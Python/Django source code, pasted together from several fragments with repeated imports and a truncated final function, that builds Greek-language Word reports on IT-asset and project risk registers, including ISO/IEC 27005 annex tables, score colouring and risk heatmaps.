                    # Second row (Status and Criticality) with default background
                    status_row = table.add_row().cells
                    status_row[0].text = "Κατάσταση (Status)"
                    status_row[1].text = asset_status.capitalize()
                    status_row[2].text = "Κρισιμότητα (Criticality)"
                    status_row[3].text = str(asset_criticality)

            # Add Opportunities (if any)
            if risk['opportunities']:
                opportunities_header = table.add_row().cells
                opportunities_header[0].merge(opportunities_header[3])
                opportunities_header[0].text = "Ευκαιρίες (Opportunities)"
                tc_pr = opportunities_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), opportunity_bg_color)
                tc_pr.append(shd)

                for opportunity_title, opportunity_desc in risk['opportunities']:
                    add_detail_rows(document, table, opportunity_title, opportunity_desc, "Title", "Description")

            # Add Threats (if any)
            if risk['threats']:
                threats_header = table.add_row().cells
                threats_header[0].merge(threats_header[3])
                threats_header[0].text = "Απειλές (Threats)"
                tc_pr = threats_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), threat_bg_color)
                tc_pr.append(shd)

                for threat_title, threat_desc in risk['threats']:
                    add_detail_rows(document, table, threat_title, threat_desc, "Title", "Description")

            # Add Mitigations
            mitigations_header = table.add_row().cells
            mitigations_header[0].merge(mitigations_header[3])
            mitigations_header[0].text = "Μέτρα Μείωσης (Mitigations)"
            tc_pr = mitigations_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:fill'), mitigation_bg_color)
            tc_pr.append(shd)

            for mitigation_title, mitigation_desc in risk['mitigations']:
                add_detail_rows(document, table, mitigation_title, mitigation_desc, "Title", "Description")

            # Add Procedures (if any)
            if risk['procedures']:
                procedures_header = table.add_row().cells
                procedures_header[0].merge(procedures_header[3])
                procedures_header[0].text = "Διαδικασίες (Procedures)"
                tc_pr = procedures_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), procedure_bg_color)
                tc_pr.append(shd)

                for proc_code, proc_revision, proc_title, proc_desc in risk['procedures']:
                    proc_row = table.add_row().cells
                    proc_row[0].text = "Κωδικός (Code)"
                    proc_row[1].text = proc_code
                    proc_row[2].text = "Αναθεώρηση (Revision)"
                    proc_row[3].text = proc_revision

                    title_row = table.add_row().cells
                    title_row[0].text = "Τίτλος (Title)"
                    title_row[1].merge(title_row[3])
                    add_html_to_word(document, title_row[1].paragraphs[0], proc_title)

                    desc_row = table.add_row().cells
                    desc_row[0].text = "Περιγραφή (Description)"
                    desc_row[1].merge(desc_row[3])
                    add_html_to_word(document, desc_row[1].paragraphs[0], proc_desc)

            risk_number += 1

# Helper function (assuming it exists elsewhere in your code)
def apply_score_color(cell, score):
    color = '#FFFFFF'  # Default white
    if score > 12:
        color = '#FF0000'  # Red for high
    elif score > 6:
        color = '#FFA500'  # Orange for medium
    else:
        color = '#00FF00'  # Green for low
    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:fill'), color)
    tc_pr.append(shd)

# Helper function (assuming it exists elsewhere in your code)
def add_detail_rows(document, table, title, description, title_label="Title", desc_label="Description"):
    title_row = table.add_row().cells
    title_row[0].text = title_label
    title_row[1].merge(title_row[3])
    add_html_to_word(document, title_row[1].paragraphs[0], title)

    desc_row = table.add_row().cells
    desc_row[0].text = desc_label
    desc_row[1].merge(desc_row[3])
    add_html_to_word(document, desc_row[1].paragraphs[0], description)



from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from docx.shared import Pt
from .models import ITAsset, Risk, Vulnerability, ITThreat  # Adjust imports based on your project structure

from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from docx.shared import Pt
from .models import ITAsset, Risk, Vulnerability, ITThreat  # Adjust imports based on your project structure

from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from docx.shared import Pt
from .models import ITAsset, Risk, Vulnerability, ITThreat  # Adjust imports based on your project structure

from docx import Document
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
from docx.enum.section import WD_ORIENT
from docx.shared import Pt

def add_annex_1_it_assets(document, portfolios):
    """Add Annex 1 for IT Assets and Related Risks, Mitigations, Vulnerabilities, Threats, and Procedures in landscape orientation, sorted A-Z."""
    # Add a section break and switch to landscape
    section = document.add_section()
    section.orientation = WD_ORIENT.LANDSCAPE
    section.page_width = Pt(842)  # A4 landscape width (11.69 inches)
    section.page_height = Pt(595)  # A4 landscape height (8.27 inches)
    section.left_margin = Pt(72)  # 1 inch
    section.right_margin = Pt(72)
    section.top_margin = Pt(72)
    section.bottom_margin = Pt(72)

    # Add Annex 1 title
    heading = document.add_heading('Παράρτημα 2: Κατάσταση Πληροφοριακών Πόρων και Σχετικών Κινδύνων', level=1)
    heading.style.font.name = 'Calibri'
    heading.style.font.size = Pt(14)

    # Introductory paragraph
    document.add_paragraph(
        'Ακολουθεί η αναλυτική κατάσταση των πληροφοριακών πόρων (IT Assets) για τα επιλεγμένα χαρτοφυλάκια, ταξινομημένων αλφαβητικά (Α-Ω), '
        'μαζί με τους σχετιζόμενους κινδύνους, τις μετριαστικές ενέργειες, τις ευπάθειες, τις απειλές πληροφοριακών συστημάτων (IT Threats) '
        'και τις σχετικές διαδικασίες σύμφωνα με τα πρότυπα ISO/IEC 27005:2022. Κάθε πόρος παρουσιάζεται σε νέα σελίδα για καλύτερη αναγνωσιμότητα.'
    ).style.font.name = 'Calibri'

    # Fetch IT assets for the selected portfolios, sorted A-Z by name
    selected_portfolio_ids = [portfolio.id for portfolio in portfolios]
    it_assets = ITAsset.objects.filter(portfolio_id__in=selected_portfolio_ids).order_by('name').prefetch_related(
        'risks', 'vulnerabilities', 'threats', 'risks__mitigations', 'risks__procedures'
    )

    # Colors for different sections
    asset_bg_color = 'E6E6FA'  # Light lavender for asset details
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section
    vuln_bg_color = 'FFFACD'  # Light yellow for vulnerabilities
    threat_bg_color = 'F4CCCC'  # Light red for IT threats
    procedure_bg_color = 'FFF2CC'  # Light yellow for procedures

    first_asset = True
    for asset in it_assets:
        # Start each asset on a new page (skip for the first asset to avoid an extra blank page)
        if not first_asset:
            document.add_page_break()
        else:
            first_asset = False

        # Add a heading for each IT asset
        document.add_heading(f'{asset.name} ({asset.asset_type.capitalize()})', level=2).style.font.name = 'Calibri'

        # Create a table for this IT asset
        table = document.add_table(rows=1, cols=4)
        table.style = 'Table Grid'

        # Asset Details Header
        asset_header = table.rows[0].cells
        asset_header[0].merge(asset_header[3])
        asset_header[0].text = "Λεπτομέρειες Πληροφοριακού Πόρου (IT Asset Details)"
        asset_header[0].paragraphs[0].runs[0].bold = True
        tc_pr = asset_header[0]._element.get_or_add_tcPr()
        shd = OxmlElement('w:shd')
        shd.set(qn('w:val'), 'clear')
        shd.set(qn('w:fill'), asset_bg_color)
        tc_pr.append(shd)

        # Asset Attributes
        attrs = [
            ("Όνομα (Name)", asset.name),
            ("Τύπος (Type)", asset.asset_type.capitalize()),
            ("Κατάσταση (Status)", asset.status.capitalize()),
            ("Κρισιμότητα (Criticality)", str(asset.criticality)),
            ("Εμπιστευτικότητα (Confidentiality)", dict(asset.CIA_CHOICES)[asset.confidentiality]),
            ("Ακεραιότητα (Integrity)", dict(asset.CIA_CHOICES)[asset.integrity]),
            ("Διαθεσιμότητα (Availability)", dict(asset.CIA_CHOICES)[asset.availability]),
            ("Περιγραφή (Description)", asset.description or "N/A"),
        ]
        for label, value in attrs:
            row = table.add_row().cells
            row[0].text = label
            row[1].merge(row[3])
            row[1].text = value

        # Related Risks
        risks = asset.risks.all()
        if risks:
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Σχετιζόμενοι Κίνδυνοι (Related Risks)"
            risk_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            for risk in risks:
                # Risk Title
                risk_title_row = table.add_row().cells
                risk_title_row[0].text = "Τίτλος Κινδύνου (Risk Title)"
                risk_title_row[1].merge(risk_title_row[3])
                add_html_to_word(document, risk_title_row[1].paragraphs[0], risk.title)

                # Risk Description
                risk_desc_row = table.add_row().cells
                risk_desc_row[0].text = "Περιγραφή Κινδύνου (Risk Description)"
                risk_desc_row[1].merge(risk_desc_row[3])
                add_html_to_word(document, risk_desc_row[1].paragraphs[0], risk.description)

                # Risk Scores with Coloring
                risk_score_row = table.add_row().cells
                risk_score_row[0].text = "Δείκτες Κινδύνου (Risk Scores)"
                risk_score_row[1].text = f"Εγγενής: {risk.inherent_likelihood} x {risk.inherent_impact} = {risk.inherent_score()}"
                risk_score_row[2].text = f"Υπολειμματικός: {risk.residual_likelihood} x {risk.residual_impact} = {risk.residual_score()}"
                risk_score_row[3].text = f"Στοχευμένος: {risk.targeted_likelihood} x {risk.targeted_impact} = {risk.targeted_score()}"
                apply_score_color(risk_score_row[1], risk.inherent_score())
                apply_score_color(risk_score_row[2], risk.residual_score())
                apply_score_color(risk_score_row[3], risk.targeted_score())

                # Mitigations
                mitigations = risk.mitigations.all()
                if mitigations:
                    mitigation_header = table.add_row().cells
                    mitigation_header[0].merge(mitigation_header[3])
                    mitigation_header[0].text = "Μέτρα Μείωσης (Mitigations)"
                    tc_pr = mitigation_header[0]._element.get_or_add_tcPr()
                    shd = OxmlElement('w:shd')
                    shd.set(qn('w:fill'), mitigation_bg_color)
                    tc_pr.append(shd)

                    for mitigation in mitigations:
                        mit_title_row = table.add_row().cells
                        mit_title_row[0].text = "Τίτλος (Title)"
                        mit_title_row[1].merge(mit_title_row[3])
                        add_html_to_word(document, mit_title_row[1].paragraphs[0], mitigation.title)

                        mit_desc_row = table.add_row().cells
                        mit_desc_row[0].text = "Περιγραφή (Description)"
                        mit_desc_row[1].merge(mit_desc_row[3])
                        add_html_to_word(document, mit_desc_row[1].paragraphs[0], mitigation.description)

                # Procedures (fetched from risks)
                procedures = risk.procedures.all()
                if procedures:
                    procedure_header = table.add_row().cells
                    procedure_header[0].merge(procedure_header[3])
                    procedure_header[0].text = "Σχετιζόμενες Διαδικασίες (Related Procedures)"
                    tc_pr = procedure_header[0]._element.get_or_add_tcPr()
                    shd = OxmlElement('w:shd')
                    shd.set(qn('w:fill'), procedure_bg_color)
                    tc_pr.append(shd)

                    for procedure in procedures:
                        proc_row = table.add_row().cells
                        proc_row[0].text = "Κωδικός (Code)"
                        proc_row[1].text = procedure.code
                        proc_row[2].text = "Αναθεώρηση (Revision)"
                        proc_row[3].text = procedure.revision

                        proc_title_row = table.add_row().cells
                        proc_title_row[0].text = "Τίτλος (Title)"
                        proc_title_row[1].merge(proc_title_row[3])
                        add_html_to_word(document, proc_title_row[1].paragraphs[0], procedure.title)

                        proc_desc_row = table.add_row().cells
                        proc_desc_row[0].text = "Περιγραφή (Description)"
                        proc_desc_row[1].merge(proc_desc_row[3])
                        add_html_to_word(document, proc_desc_row[1].paragraphs[0], procedure.description)

                # Empty row after each risk and its details
                empty_row = table.add_row().cells
                empty_row[0].merge(empty_row[3])
                empty_row[0].text = ""  # Empty cell for spacing

        # Related Vulnerabilities
        vulnerabilities = asset.vulnerabilities.all()
        if vulnerabilities:
            vuln_header = table.add_row().cells
            vuln_header[0].merge(vuln_header[3])
            vuln_header[0].text = "Σχετιζόμενες Ευπάθειες (Related Vulnerabilities)"
            vuln_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = vuln_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:fill'), vuln_bg_color)
            tc_pr.append(shd)

            for vuln in vulnerabilities:
                vuln_row = table.add_row().cells
                vuln_row[0].text = "Κωδικός (Code)"
                vuln_row[1].text = vuln.code
                vuln_row[2].text = "Κατηγορία (Category)"
                vuln_row[3].text = vuln.get_category_display()

                vuln_desc_row = table.add_row().cells
                vuln_desc_row[0].text = "Περιγραφή (Description)"
                vuln_desc_row[1].merge(vuln_desc_row[3])
                vuln_desc_row[1].text = vuln.description

        # Related IT Threats
        it_threats = asset.threats.all()
        if it_threats:
            threat_header = table.add_row().cells
            threat_header[0].merge(threat_header[3])
            threat_header[0].text = "Σχετιζόμενες Απειλές Πληροφοριακών Συστημάτων (Related IT Threats)"
            threat_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = threat_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:fill'), threat_bg_color)
            tc_pr.append(shd)

            for threat in it_threats:
                threat_row = table.add_row().cells
                threat_row[0].text = "Κωδικός (Code)"
                threat_row[1].text = threat.code
                threat_row[2].text = "Κατηγορία (Category)"
                threat_row[3].text = threat.get_category_display()

                threat_desc_row = table.add_row().cells
                threat_desc_row[0].text = "Περιγραφή (Description)"
                threat_desc_row[1].merge(threat_desc_row[3])
                threat_desc_row[1].text = threat.description

                threat_sources_row = table.add_row().cells
                threat_sources_row[0].text = "Πηγές Κινδύνου (Risk Sources)"
                threat_sources_row[1].merge(threat_sources_row[3])
                threat_sources_row[1].text = threat.risk_sources

# Helper function (assuming it exists elsewhere in your code)
def apply_score_color(cell, score):
    color = '#FFFFFF'  # Default white
    if score > 12:
        color = '#FF0000'  # Red for high
    elif score > 6:
        color = '#FFA500'  # Orange for medium
    else:
        color = '#00FF00'  # Green for low
    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:fill'), color)
    tc_pr.append(shd)



# ==================


from django.db.models import Q

@permission_required('orm.can_view_reports', raise_exception=True)
def generate_project_risk_report(request):
    main_report = Document()  # or Document(path_to_template)

    if request.method == "POST":
        # Gather selected portfolios from user input
        selected_portfolio_ids = request.POST.getlist('portfolios')
        selected_portfolios = Portfolio.objects.filter(id__in=selected_portfolio_ids)

        # Calculate total risks based on selected portfolios

        risks = Risk.objects.filter(portfolio__in=selected_portfolios).exclude(
            Q(portfolio__name__icontains='archive')  
            # Q(portfolio__name__icontains='sub') | 
            # Q(portfolio__name__icontains='set')
        )


        total_risks = risks.count()

        # Initialize risk data matrices for heatmaps
        inherent_data = [[[] for _ in range(5)] for _ in range(5)]
        residual_data = [[[] for _ in range(5)] for _ in range(5)]
        targeted_data = [[[] for _ in range(5)] for _ in range(5)]

        # Populate each risk data matrix with appropriate scores
        for risk in risks:
            inherent_data[risk.inherent_likelihood - 1][risk.inherent_impact - 1].append(risk)
            residual_data[risk.residual_likelihood - 1][risk.residual_impact - 1].append(risk)
            targeted_data[risk.targeted_likelihood - 1][risk.targeted_impact - 1].append(risk)

        # Path to the logo
        logo_path = finders.find('images/avax-logo.jpeg')
        if not logo_path:
            raise FileNotFoundError('Logo file not found in static/images.')

        # Prepare document and add sections
        buffer = BytesIO()
        with zipfile.ZipFile(buffer, 'w') as zip_archive:
            main_report = Document()
            set_calibri_font(main_report)
            add_project_risk_cover_page_gr(main_report, logo_path, selected_portfolios)  # Cover page

            # Pass selected portfolios, total risks, and matrices for heatmap generation to executive summary
            add_table_of_contents_gr(main_report)  # Table of Contents

            add_executive_summary_project(
                main_report,
                selected_portfolios,
                total_risks,
                inherent_data,
                residual_data,
                targeted_data
            )
            
            add_page_numbers_gr(main_report)

            # Save and add the document to the ZIP archive
            main_report_io = BytesIO()
            main_report.save(main_report_io)
            main_report_io.seek(0)
            zip_archive.writestr(f'project_risk_report_GREEK.docx', main_report_io.read())

        # Set the buffer position and return the response
        buffer.seek(0)
        response = HttpResponse(buffer, content_type='application/zip')
        response['Content-Disposition'] = f'attachment; filename="project_risk_report_GREEK.zip"'
        return response


from docx.shared import Pt, Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from django.utils.timezone import now

def add_project_risk_cover_page_gr(document, logo_path, selected_portfolios):
    # Set font to Calibri for the document
    for style in document.styles:
        if style.name == 'Normal':
            style.font.name = 'Calibri'
            style.font.size = Pt(12)

    # Header: Add logo to the header for all pages, aligned to the left
    section = document.sections[0]
    header = section.header
    header_paragraph = header.paragraphs[0]
    header_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.LEFT  # Align logo to the left
    header_run = header_paragraph.add_run()
    header_run.add_picture(logo_path, width=Inches(1.5))  # Adjust width as needed

    # Add title on cover page
    title = document.add_paragraph()
    title_run = title.add_run("Αναφορά Διαχείρισης Κινδύνων Έργου (Project Risk Report)")
    title_run.bold = True
    title_run.font.size = Pt(20)
    title.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add a line after the title
    title_line = document.add_paragraph()
    title_line.add_run("______________________________________").font.size = Pt(10)
    title_line.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Subtitle for selected portfolios
    subtitle = document.add_paragraph("Σχετικά Χαρτοφυλάκια Έργων (Selected Project Portfolios):")
    subtitle.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
    subtitle_run = subtitle.add_run()
    subtitle_run.font.size = Pt(14)

    # List each selected portfolio
    for portfolio in selected_portfolios:
        portfolio_paragraph = document.add_paragraph(f"- {portfolio.name}")
        portfolio_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add space after the portfolio list
    document.add_paragraph("\n")

    # Add date
    date_paragraph = document.add_paragraph()
    date_paragraph.add_run(f"Ημερομηνία (Date): {now().strftime('%d-%m-%Y')}")
    date_paragraph.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Add "Prepared by" section
    prepared_by = document.add_paragraph("Προετοιμάστηκε από (Prepared by): [Your Company Name Here]")
    prepared_by.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

    # Insert a page break before the Table of Contents
    document.add_page_break()


# Function to filter risks based on selected portfolios
def filter_risks_for_selected_portfolios(all_risks, selected_portfolios):
    # Filters all_risks to include only those in selected_portfolios
    return [risk for risk in all_risks if risk.portfolio in selected_portfolios]



from docx.shared import Pt, RGBColor
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
import io, base64
from docx.shared import Inches

import io
import base64
from docx.shared import Inches

def add_executive_summary_project(document, selected_portfolios, total_risks, inherent_data, residual_data, targeted_data):
    document.add_page_break()

    # Executive Summary Title
    document.add_heading('\nΔιοικητική Περίληψη Έργου (Project Executive Summary)', level=1)

    # Introduction to the Project Risk Report
    document.add_paragraph(
        '\nΗ παρούσα αναφορά παρέχει μια ολοκληρωμένη ανάλυση των δραστηριοτήτων διαχείρισης κινδύνων για τα έργα του οργανισμού. '
        'Ο κύριος στόχος της διαχείρισης κινδύνων για τα συγκεκριμένα έργα είναι η αναγνώριση, αξιολόγηση και μείωση των κινδύνων '
        'που σχετίζονται με τις ιδιαίτερες απαιτήσεις και προκλήσεις κάθε έργου, με στόχο την επιτυχή υλοποίηση και αποδοτικότητα.'
    )

    document.add_paragraph(
        "\nΗ παρακάτω σύνοψη παρέχει μια εικόνα για το τοπίο κινδύνου των έργων, με έμφαση στις βαθμολογίες κινδύνου για κάθε "
        "κατηγορία κινδύνου: εγγενείς, υπολειμματικές και στοχευμένες βαθμολογίες."
    )

    # Section to list selected portfolios
    document.add_heading('\nΕξεταζόμενα Χαρτοφυλάκια Έργων (Examined Project Portfolios)', level=2)
    for portfolio in selected_portfolios:
        document.add_paragraph(f"- {portfolio.name}", style="List Bullet")

    def clean_rich_text(text):
        # Function to clean HTML tags from TinyMCE rich text
        return re.sub(r'<.*?>', '', text)

    for portfolio in selected_portfolios:
        if hasattr(portfolio, 'description') and portfolio.description:
            clean_description = clean_rich_text(portfolio.description)
            document.add_paragraph(f"{portfolio.name}: {clean_description}", style="Body Text")
 

    # Risk Evaluation Methodology with ALARP Principle
    document.add_heading('\nΜεθοδολογία Αξιολόγησης Κινδύνων Έργου\n', level=2)
    paragraph = document.add_paragraph()
    run1 = paragraph.add_run(
        'Κάθε κίνδυνος στα έργα αξιολογείται βάσει δύο διαστάσεων: της πιθανότητας εμφάνισης και της δυνητικής επίπτωσης στο έργο. '
        'Η βαθμολογία κινδύνου προκύπτει από το γινόμενο της πιθανότητας και της επίπτωσης (Likelihood x Impact = Risk Score). '
    )
    run2 = paragraph.add_run('Οι υπολειπόμενοι κίνδυνοι ')
    run2.bold = True
    run3 = paragraph.add_run(
        'διατηρούνται στο χαμηλότερο - κατά το δυνατόν - επίπεδο, σύμφωνα με την αρχή '
    )
    run4 = paragraph.add_run('ALARP (As Low As Reasonably Practicable)')
    run4.bold = True
    run5 = paragraph.add_run(
        ', η οποία επιδιώκει τη μείωση των κινδύνων όσο είναι πρακτικά δυνατό χωρίς δυσανάλογο κόστος ή δυσκολία.'
    )


    # Likelihood and Impact Score Table
    table = document.add_table(rows=1, cols=3)
    table.style = 'Table Grid'
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Βαθμολογία (Score)'
    hdr_cells[1].text = 'Πιθανότητα (Likelihood)'
    hdr_cells[2].text = 'Επίπτωση (Impact)'

    table_data = [
        (5, 'Πολύ Υψηλή: Σχεδόν βέβαιη εμφάνιση', 'Σοβαρή επίπτωση στο έργο'),
        (4, 'Υψηλή: Πιθανή εμφάνιση', 'Σημαντική επίπτωση στο έργο'),
          
        (3, 'Μέτρια: Πιθανή εμφάνιση', 'Αξιοσημείωτη επίπτωση στο έργο'),
        (2, 'Χαμηλή: Μικρή πιθανότητα εμφάνισης', 'Περιορισμένη επίπτωση στο έργο'),
        (1, 'Πολύ Χαμηλή: Απίθανο να συμβεί', 'Ελάχιστη επίπτωση στο έργο')
       
    ]

    for score, likelihood, impact in table_data:
        row_cells = table.add_row().cells
        row_cells[0].text = str(score)
        row_cells[1].text = likelihood
        row_cells[2].text = impact

    # Risk Severity Table with Colors
    document.add_heading('\nΚατηγοριοποίηση Σοβαρότητας Κινδύνου Έργου\n', level=2)
    severity_table = document.add_table(rows=1, cols=2)
    severity_table.style = 'Table Grid'
    severity_hdr_cells = severity_table.rows[0].cells
    severity_hdr_cells[0].text = 'Βαθμολογία Κινδύνου (Risk Score)'
    severity_hdr_cells[1].text = 'Σοβαρότητα Κινδύνου (Severity Level)'

    severity_data = [
            
        ('15 - 25', 'Υψηλή (Κόκκινο)', 'FF0000'),
        ('8 - 12', 'Μέτρια (Κίτρινο)', 'FFC000') ,
        ('1 - 6', 'Χαμηλή (Πράσινο)', '00B050'),
    ]

    for score_range, severity, color_hex in severity_data:
        row_cells = severity_table.add_row().cells
        row_cells[0].text = score_range
        row_cells[1].text = severity
        for cell in row_cells:
            tc_pr = cell._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), color_hex)
            tc_pr.append(shd)

    # Summary of Active Project Risks
    document.add_paragraph('\n')
    # document.add_paragraph(f'Συνολικός αριθμός ενεργών κινδύνων για τα επιλεγμένα χαρτοφυλάκια: {total_risks}')

    # Section for Inherent Risk Score
    document.add_heading('\nΕγγενείς (Inherent) Βαθμολογίες Κινδύνου Έργου', level=2)
    paragraph1 = document.add_paragraph()
    run1 = paragraph1.add_run('\nΗ Εγγενής (Inherent) Βαθμολογία Κινδύνου Έργου ')
    run1.bold = True
    run2 = paragraph1.add_run(
        'αντιπροσωπεύει το αρχικό επίπεδο κινδύνου που σχετίζεται με ένα έργο, χωρίς να λαμβάνονται υπόψη τα μέτρα μετριασμού. '
        'Αυτή η βαθμολογία αποτυπώνει την ακατέργαστη μορφή κινδύνου που ενυπάρχει στις διαδικασίες και τις λειτουργίες του έργου.'
    )

    # New paragraph for additional explanation
    paragraph2 = document.add_paragraph(
        'Στον κατασκευαστικό τομέα, οι εγγενείς (Inherent) κίνδυνοι στα έργα είναι ιδιαίτερα υψηλοί λόγω των απαιτητικών συνθηκών και της '
        'πολύπλοκης φύσης των δραστηριοτήτων. Αυτοί οι κίνδυνοι περιλαμβάνουν την εργασία σε επικίνδυνες περιοχές, τη χρήση βαρέων μηχανημάτων, '
        'και την εκτέλεση σύνθετων κατασκευαστικών διεργασιών, που όλα μαζί δημιουργούν απαιτητικές συνθήκες για την ασφάλεια και τη συνέπεια των έργων. '
        'Η συστηματική παρακολούθηση αυτών των κινδύνων είναι ουσιώδης για την επιτυχή διαχείριση του έργου και την αποτροπή ατυχημάτων.'
    )

    # Section for Residual Risk Score
    document.add_heading('\nΥπολειπόμενες (Residual) Βαθμολογίες Κινδύνου Έργου', level=2)
    paragraph3 = document.add_paragraph()
    run3 = paragraph3.add_run('\nΗ Υπολειπόμενη (Residual) Βαθμολογία Κινδύνου Έργου ')
    run3.bold = True
    run4 = paragraph3.add_run(
        'αντιπροσωπεύει τον κίνδυνο που παραμένει μετά την εφαρμογή των μέτρων μετριασμού (Mitigations). Παρά τη σημαντική μείωση του κινδύνου μέσω των μέτρων, '
        'παραμένουν ακόμα ορισμένοι κίνδυνοι που χρήζουν συνεχιζόμενης παρακολούθησης για τη διατήρηση της ασφάλειας και τη διασφάλιση της επιτυχούς εκτέλεσης του έργου.'
    )

    document.add_page_break()

    # Explanation of Heatmaps
    document.add_paragraph(
        'Τα παρακάτω διαγράμματα (Heatmaps) απεικονίζουν τη διανομή κινδύνων με βάση την Πιθανότητα (Likelihood) και την Επίπτωση (Impact), '
        'δίνοντας μια συνολική εικόνα των κινδύνων σε διαφορετικά επίπεδα σοβαρότητας για κάθε έργο.'
    )
    
    document.add_paragraph(
        'Με τη σύγκριση των διαγραμμάτων Εγγενών (Inherent) και Υπολειπόμενων (Residual) Βαθμολογιών Κινδύνου, γίνεται εμφανές πόσο έχουν περιοριστεί οι κίνδυνοι '
        'μέσω των μέτρων μετριασμού, επιτρέποντας τη μετάβαση των κινδύνων σε λιγότερο σοβαρές κατηγορίες και υποστηρίζοντας την ασφάλεια και την ομαλή πρόοδο του έργου.'
    )

    # Generate and insert the Inherent Risk Heatmap
    inherent_heatmap_base64, inherent_count_matrix, inherent_score_matrix = generate_heatmap_image(
        'Inherent Project Risk Scores Heatmap', inherent_data, 'inherent'
    )
    document.add_picture(io.BytesIO(base64.b64decode(inherent_heatmap_base64)), width=Inches(4))

    # Generate and insert the Residual Risk Heatmap
    residual_heatmap_base64, residual_count_matrix, residual_score_matrix = generate_heatmap_image(
        'Residual Project Risk Scores Heatmap', residual_data, 'residual'
    )
    document.add_picture(io.BytesIO(base64.b64decode(residual_heatmap_base64)), width=Inches(4))

    # Generate and insert the Targeted Risk Heatmap
    
    # Section for Targeted Risk Score
    document.add_heading('\nΣτοχευμένες (Targeted) Βαθμολογίες Κινδύνου Έργου', level=2)
    paragraph5 = document.add_paragraph()
    run5 = paragraph5.add_run('\nΗ Στοχευμένη (Targeted) Βαθμολογία Κινδύνου Έργου ')
    run5.bold = True
    run6 = paragraph5.add_run(
        'καθορίζει το επιθυμητό επίπεδο κινδύνου που πρέπει να επιτευχθεί στο πλαίσιο του έργου, μέσω της εφαρμογής '
        'πρόσθετων μέτρων μετριασμού και στρατηγικών βελτίωσης. Στόχος είναι η μείωση του κινδύνου σε ένα αποδεκτό επίπεδο '
        'που διασφαλίζει την ασφάλεια, την αποδοτικότητα και την επιτυχή ολοκλήρωση του έργου σύμφωνα με τα πρότυπα του οργανισμού.'
    )

    # New paragraph for additional explanation about Targeted Risk Score
    paragraph6 = document.add_paragraph(
        'Η Στοχευμένη (Targeted) Βαθμολογία Κινδύνου έργου αντικατοπτρίζει τη δέσμευση του οργανισμού για συνεχή βελτίωση, '
        'εξασφαλίζοντας ότι οι κίνδυνοι διατηρούνται σε επίπεδα που υποστηρίζουν τόσο την ασφάλεια όσο και την επίτευξη των στόχων του έργου.'
    )

    
    targeted_heatmap_base64, targeted_count_matrix, targeted_score_matrix = generate_heatmap_image(
        'Targeted Project Risk Scores Heatmap', targeted_data, 'targeted'
    )
    document.add_picture(io.BytesIO(base64.b64decode(targeted_heatmap_base64)), width=Inches(4))

    chart_image_base64 = generate_portfolio_category_risk_chart(selected_portfolios)


    
    chart_image_data = base64.b64decode(chart_image_base64.split(",")[1])
    chart_image_io = io.BytesIO(chart_image_data)
    document.add_paragraph("Επίπεδα (Residual) Κινδύνου ανά Κατηγορία για τα Επιλεγμένα Χαρτοφυλάκια", style='Heading 2')
    document.add_picture(chart_image_io, width=Inches(7))

    # Page break after the summary
    document.add_page_break()
    # Recommendation Section with ALARP Concept
    add_residual_risk_pivot_section(document, selected_portfolios)


    from PIL import Image
    def rotate_image_bytes(image_bytes, degrees):
    # Open the image from bytes
        image = Image.open(io.BytesIO(image_bytes))
        # Rotate the image by the specified degrees
        rotated_image = image.rotate(degrees, expand=True)
        # Save the rotated image back into a BytesIO object
        rotated_image_io = io.BytesIO()
        rotated_image.save(rotated_image_io, format='PNG')
        rotated_image_io.seek(0)  # Reset the pointer to the start of the BytesIO object
        return rotated_image_io

        # Add a page break after the summary
    document.add_page_break()


from docx.shared import Inches, Pt
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.enum.section import WD_ORIENT
from django.utils.html import strip_tags
from orm.models import Risk

def clean_rich_text(html_text):
    """Clean HTML tags like <p> from TinyMCE content and ensure proper formatting."""
    return strip_tags(html_text).replace('&nbsp;', ' ').strip()

def set_cell_vertical_alignment(cell, alignment):
    """Set vertical alignment for a table cell."""
    cell_properties = cell._element.get_or_add_tcPr()
    
    # Create vertical alignment element
    vertical_alignment = OxmlElement('w:vAlign')
    vertical_alignment.set(qn('w:val'), alignment)
    
